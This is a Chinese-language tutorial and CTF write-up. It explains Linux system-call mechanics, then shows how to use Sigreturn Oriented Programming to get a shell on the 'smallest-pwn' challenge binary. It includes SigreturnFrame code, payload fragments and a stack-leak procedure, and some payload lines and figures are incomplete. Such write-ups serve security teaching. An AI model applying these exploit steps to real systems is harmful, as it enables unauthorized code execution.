0x02 背景知识

系统调用

什么是系统调用

一般的把操作系统的进程空间分为用户空间（user space）与内核空间（kernel space），我们在执行某些操作的时候会在从用户空间切换到内核空间，比如在程序调用到 open、for、read、write 等函数时。那么空间的切换需要一个通道，或者说一个载体，这就是就是系统调用。
系统调用是程序进入内核以执行某些任务的方式。程序使用系统调用来执行各种操作，例如：创建进程，执行网络和文件IO等，系统调用在这些操作过程中作为沟通用户空间与内核空间的桥梁存在。
在x86-64 CPU中有称为特权等级的概念，在wiki中给出

简单来说，特权级别是一种保护机制，是权限控制的一种方式。
它分为4 个等级，分别是ring 0 - ring 3，用户空间代码运行在 ring 3，内核空间代码运行在 ring 0，其中在大多数操作系统中，ring 0 是具有最高特权的级别，并且与物理硬件（例如CPU和内存）进行直接交互。
计算机会根据等级来判断是否可以对此资源进行访问，所以程序需要进行系统调用来执行各种操作。

系统调用种类

传统系统调用

Linux 内核预留了一个特殊的软中断号128 (0x80)，用户空间程序使用它可以进入内核执行系统调用，对应的中断处理函数是ia32_syscall。而int 指令可以产生软中断，然后软中断触发内核执行，这就是传统的系统调用接口。
那么是怎么执行的？
从 trap_init 函数开始，通过set_system_intr_gate(IA32_SYSCALL_VECTOR, ia32_syscall)(其中 IA32_SYSCALL_VECTOR 为 0x80，ia32_syscall用来注册的一个内核注册了一个系统调用回调函数）然后调用ia32_sys_call_table这个一个中断号列表实现真正的系统调用。

另外对这个过程做了规定，eax中存放系统调用的值，具体系统调用表请见syscall man page。这样就通过执行int 0x80，根据eax的值来触发不同系统调用。
特别的，在系统调用之前需要保存现场，系统调用后需要恢复现场。通常的执行转交给 ia32_syscall 时会发生特权级别切换，其结果是进入 ia32_syscall 时的需要保存上下文到栈中。返回地址、包含特权级别的 CPU flags 以及其他一些参数都在 ia32_syscall 执行之前压入栈顶。所以，结束时需要恢复上下文，内核只需要将这些值从栈里复制回它们原来所在的寄存器，程序就可以回到用户空间继续执行，其中最简单的做法是通过 iret 指令，Intel 指令集手册解释说 iret 指令从栈上依次 pop 返回地址和保存的寄存器值。

快速系统调用

快速系统调用分为
在 32bit 系统上：使用 sysenter 和 sysexit
在 64bit 系统上：使用 syscall 和 sysret
刚才说到，Linux下传统的系统调用是通过软中断(0x80)实现的，但是采用传统的int 0x80的系统调用浪费了很多时间，int 0x80 做了更多的工作，导致了 CPU 的流水线中断，从而带来了额外的开销，所以速度很慢，而fast system call可以弥补这个缺点，所以才最终决定在linux内核中用后者都替换前者（最终在2.6版本的内核中才加入了此功能）。
如何用替换fast system call方式替换以前的int 0x80呢？linux 内核需要考虑到这点：有的机器并不支持fast system call方式，于是需要在glibc确定，进行系统调用的时候就从内核给的这个地址调用，这个地址指向的内容要么是int 0x80调用方式，要么是fast system call方式调用方式，内核会根据机器来选择其中一个，这样一来kernel与glibc的实现了完美的到配合，而这个地址便是vsyscall的首地址，后面会说到。
先来看下32bit下的fast system call，由于需要 glibc和内核之间的协作，为了使 sysenter 能够接收到系统调用请求，内核必须设置 3 个 MSR：A32_SYSENTER_EIP、 IA32_SYSENTER_CS 、IA32_SYSENTER_ESP ，其中内核将回调函数地址放入 IA32_SYSENTER_EIP中 ，当 sysenter 指令执行的时候，就触发调用相应的回调函数。
和传统软中断系统调用类似，使用 sysenter 创建快速系统调用时也需要一个约定

进行sysenter系统调用时，因为内核和它的进出系统调用的约定随着时间在变，最终你的代码会变得不可用，一般通过内核函数 __kernel_vsyscall进行，它内部封装了 sysenter 调用约定

和传统系统调用一样，依然是注册一个回调函数，然后用系统调用编号作为索引去 ia32_sys_call_table 列表查找，相应的iret的对应指令是sysexit 指令，用来恢复用户程序的执行。
64bit下也是一样的，要使内核接收系统调用请求，必须将对应的回调函数地址写到 LSTAR MSR，system_call会调用sys_call_table实现系统调用，然后sysret 指令将执行过程返还给用户程序，以上这两个过程之中也要进行保存和恢复上下文，具体可见the-definitive-guide-to-linux-system-calls。大体了解完后，我们会发现软件中断可以实现系统调用，eax/rax值绝对执行哪一种系统调用，另外重要的是这都要涉及到现场保存和恢复问题。

0x03 srop

什么是srop

SROP(Sigreturn Oriented Programming) 于 2014 年被 Vrije Universiteit Amsterdam 的 Erik Bosman 提出，其相关研究Framing Signals — A Return to Portable Shellcode发表在安全顶级会议 Oakland 2014 上。
刚才已经了解了系统调用，我们知道一般触发方式就是中断，srop就是利用这一机制进行操作。
我们先看一下中断的步骤

发起中断后，程序会从用户空间转移到内核空间，经过了解我们知道当发生中断的时候，在执行回调函数之前，需要将程序此时的状态和内容进行存储，也就是保护现场（在第一部分提到），主要是将所有寄存器压入栈中，以及压入 signal 信息，以及指向 sigreturn 的系统调用地址。

当保存完上下文信息后，程序控制权交给signal handler进行处理，直到处理结束，此时程序需要继续运行。
既然原来的程序继续执行，那么应该从中断前的点为出发点，就得将在stack保存的信息进行恢复，怎么样去恢复呢？程序就会执行sigreturn 系统调用，因为栈中已经保存了 sigreturn的地址。
那么我们就看一下sigreturn 系统调用会发生什么？

看似很完美，但是却忽视了一个问题。
Signal Frame 被保存在用户的地址空间中，所以用户是可以读写的，而且由于内核与信号处理程序无关 (kernel agnostic about signal handlers)，它并不会去记录这个 signal 对应的 Signal Frame，也就是中断结束后恢复的Signal Frame和中断开始时保存的Signal Frame是否是一致的不会去检查，即使用户对Signal Frame进行修改，也会正常执行 sigreturn 系统调用，将寄存器信息进行恢复。拥有以上两个条件，用户就可以控制程序的执行，srop也就是出现了。

怎么样srop

就像刚才说到的用户可以对Signal Frame进行修改并通过执行 sigreturn 系统调用控制寄存器。

以x86的为例子，sigreturn 系统调用后，把伪造的sigframe进行恢复，如果我们构造execve(‘/bin/sh‘,null,null)的寄存器信息，那么恢复完后，继续执行int 0x80，执行execve(‘/bin/sh‘,null,null)获得权限。
下面通过一个360春秋杯中的题目smallest-pwn深入了解一下怎么去利用srop进行getshell

简单分析一下
xor rax,rax后 rax == 0x0
mov edx,0x400后 rdx == 0x400
mov rsi,rsp后 rsi == 此时栈顶的值
mov rdi,rax后 rdi == 0x0
最后syscall 执行系统调用，注意此时rax == 0x0 会调用read函数进行读取数据。
可以发现read(rdi，rsi， rdx)就是想栈读入0x400个字节
动态调试一下

可以发现就是read(0，&rsp， 0x400)
那么我们怎么去利用？
很显然0x400完全足够读入一个sigreturn Frame，那么我们就可以进行构造了
那么针对x64位要执行execve(‘/bin/sh’,0,0)需要有什么前提条件？
首先rax 为0xb，其次rdi 为’/bin/sh’的addr，最后rip指向syscall的地址。然后程序进行执行，这样才会execve(‘/bin/sh’,0,0)
那么怎么使得这些寄存器是这样的布置？
那么需要sigreturn Frame构造，然后执行sigreturn即可布置寄存器的值
构造一下sigreturn Frame
frame = SigreturnFrame(kernel=”amd64”)
frame.rax = constants.SYS_execve
frame.rdi = binsh_addr
frame.rsi = 0
frame.rdx = 0
frame.rip = sigreturn_addr
执行sigreturn后，就会把寄存器是这样的布置好，进而执行execve(‘/bin/sh’,0,0)
但是此题来说，找不到sigreturn的gadget，只能去构造sigreturn；也找不到/bin/sh，需要去写入；另外如果完成execve(‘/bin/sh’,0,0)的frame构造还需要一个已知的栈地址。
一顿分析后，思路应该是这样：
能不能在某一个地址写入如下

只需要让rip指向0xX的syscall_addr，那么就可以execve(‘/bin/sh’,0,0)
如想实现上一步的操作，我们最好是read这个庞然大物到一个已知的地址（0xX）处，因为我们需要在faker frame设置rdi的值：0xY=0xX+N，必须获得一个已知的栈地址才能构造，然后将0xX的syscall_addr读入rip，使得faker frame恢复。
如想实现上一步，我们需要知道一个stack_addr（0xX），使用write函数去泄漏；还要构造一个read函数，read(0, 0xX , 0x400)将shellcode写入。
看着很合理，下面就开始一步一步实现

第一步：泄漏栈地址
上面分析到，我们需构造一个read函数，还需要构造一个write函数，那么不妨先多写几个程序首地址进行循环，这里写入三个0x4000b0。

然后就是构造一个write函数：write(1, addr, 0x400)。使用系统调用去执行write函数，我们知道write函数调用号是1，那么rax需要设置为1，另外第一个参数rdi也要是1。
怎么去构造？
首先我们得了解一个知识点，RAX 寄存器的值又可以通过控制某个函数的返回值来间接控制，比如说 read 函数的返回值为读取的字节数，因此我们可以使得read一个字节来进行控制rax的值，恰好程序中会把rax赋值给rdi。但是在程序中，由于xor rax,rax执行，rax始终为0，我们只需要跳过 0x4000b0，去执行0x4000b3。具体的操作办法就是在执行read函数时，读入一个\xb3字节即可完成以上工作。

程序再次循环的时候，执行read(0，0x7ffe2634a5f8， 0x400)，传入一个\xb3修改内容。当执行下一次循环的时候，程序会write(1, 0x7ffe2634a608, 0x400)，也就是0x7ffe2634c103（在栈上保存着很多栈的地址，如果可以把这些地址打印出来，就可以获取一个栈上的地址，进而获得一个可以读写的地址）。

第二步：构造read函数，将execve的frame写入0x7ffe2634c103，或者他的下几个单元处，这里选择写入下一个单元0x7ffe2634c0ed。

如果将这个frame写入到栈中，再考虑怎么去执行，恢复这个frame。
既然要恢复frame，则需要执行sigreturn，那么就是构造sigreturn执行需要的条件：rax=0xf；调用syscall。
刚才我们说到rax怎么去控制，这里可以通过读取15个字节来控制rax的值，然后程序执行syscall，也就是0x4000be。
构造payload：sigreturn = p64(syscall_ret) + ‘b’ 7
因此操作分为两部分，首先读入p64(0x4000b0)+’a’8+sigframe

read函数执行完后，会继续进行下一次循环，再次读入相应payload

然后程序执行ret后进行syscall调用，就会执行sigreturn系统调用，将frame进行恢复。

现在就是再执行向0x7ffe2634c0ed写内容的write函数了。

最后总结一下流程，大体如下：
1、随便泄漏一个栈地址

2、写入read(0,stack_addr,0x400)的SigreturnFrame，进而通过执行sigreturn的系统调用，执行read(0,stack_addr,0x400)

3、写入execve(‘/bin/sh’,0,0)的SigreturnFrame，进而通过执行sigreturn的系统调用，执行execve(‘/bin/sh’,0,0)
